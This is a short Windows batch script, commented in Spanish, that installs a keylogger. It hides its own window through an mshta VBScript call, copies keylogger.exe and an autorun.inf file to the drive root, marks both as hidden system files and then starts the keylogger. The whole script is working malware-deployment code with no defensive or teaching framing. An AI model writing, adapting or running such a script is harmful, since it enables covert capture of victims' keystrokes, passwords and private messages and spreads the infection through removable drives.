@echo off
REM Ocultar ventana
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin

REM Copiar keylogger al USB
copy keylogger.exe %~d0\
copy autorun.inf %~d0\

REM Ocultar archivos
attrib +h +s %~d0\keylogger.exe
attrib +h +s %~d0\autorun.inf

REM Ejecutar keylogger
start "" %~d0\keylogger.exe

echo Instalacion completada